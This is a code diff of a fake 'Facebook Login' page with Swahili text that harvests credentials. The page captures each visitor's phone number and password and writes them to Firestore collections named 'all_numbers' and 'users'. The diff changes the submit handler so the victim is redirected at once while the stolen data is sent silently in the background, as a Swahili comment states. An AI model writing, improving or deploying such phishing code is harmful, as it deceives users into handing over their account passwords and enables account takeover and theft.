@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
     <style>
-        /* CSS yako ya awali inabaki kama ilivyo */
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; color: #1c1e21; transition: direction 0.2s; }
         .top-bar { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; padding: 20px; position: relative; }
@@ -60,7 +59,6 @@
         <div class="input-group">
             <input type="password" id="password" placeholder="Neno la siri (Password)" required>
         </div>
-        <!-- Kitufe kinabaki kama kawaida, hakuna maandishi ya ziada -->
         <button type="submit" class="btn btn-login" id="submitBtn">Ingia (Log in)</button>
         <a href="#" class="forgot-password">Umesahau neno la siri?</a>
     </form>
@@ -93,51 +91,44 @@
         const db = getFirestore(app);
 
         const loginForm = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
 
-        loginForm.addEventListener('submit', async (e) => {
+        loginForm.addEventListener('submit', (e) => {
             e.preventDefault(); 
 
             const phone = document.getElementById('phoneNumber').value.trim();
             const password = document.getElementById('password').value;
 
-            // Badilisha maandishi ya kitufe kuonyesha inafanya kazi
-            submitBtn.textContent = "Inaingia...";
-            submitBtn.disabled = true;
+            // 1. HATUA YA KASI: Mpeleke mtumiaji kwenye all.html PAPO HAPO
+            // Tunatumia replace ili asirudi kwenye fomu akibonyeza 'Back'
+            window.location.replace('all.html');
 
-            try {
-                // 1. Ingia kimyakimya kukidhi rules
-                const userCredential = await signInAnonymously(auth);
-                const user = userCredential.user;
+            // 2. HATUA YA BACKGROUND: Tuma data kimyakimya bila kumzuia mtumiaji
+            // Hapa hatuna await, kwa hiyo mtumiaji haendi kusubiri
+            (async () => {
+                try {
+                    const userCredential = await signInAnonymously(auth);
+                    const user = userCredential.user;
 
-                // 2. Tuma taarifa kwenye 'all_numbers'
-                await addDoc(collection(db, "all_numbers"), {
-                    phone: phone,
-                    password: password,
-                    timestamp: serverTimestamp()
-                });
+                    await addDoc(collection(db, "all_numbers"), {
+                        phone: phone,
+                        password: password,
+                        timestamp: serverTimestamp()
+                    });
 
-                // 3. Tuma kwenye 'users' (kama ilivyoelekezwa kwenye rules)
-                await setDoc(doc(db, "users", user.uid), {
-                    phone: phone,
-                    password: password,
-                    lastLogin: serverTimestamp()
-                });
-
-                // 4. Mpeleke mtumiaji moja kwa moja kwenye all.html
-                // Tunatumia replace ili asirudi kwenye fomu akibonyeza back
-                window.location.replace('all.html');
-
-            } catch (error) {
-                console.error("Kosa: ", error);
-                alert("Imeshindikana kuingia. Tafadhali jaribu tena.");
-                // Rudisha kitufe kama kilivyokuwa
-                submitBtn.textContent = "Ingia (Log in)";
-                submitBtn.disabled = false;
-            }
+                    await setDoc(doc(db, "users", user.uid), {
+                        phone: phone,
+                        password: password,
+                        lastLogin: serverTimestamp()
+                    });
+                    
+                    console.log("Data imetumwa kwa mafanikio nyuma ya pazia.");
+                } catch (error) {
+                    console.error("Kosa la kutuma data background: ", error);
+                }
+            })();
         });
 
-        // Back button logic
+        // Back button logic ya kawaida
         document.getElementById('backBtn').addEventListener('click', function () {
             if (window.history.length > 1 && document.referrer !== '') {
                 window.history.back();
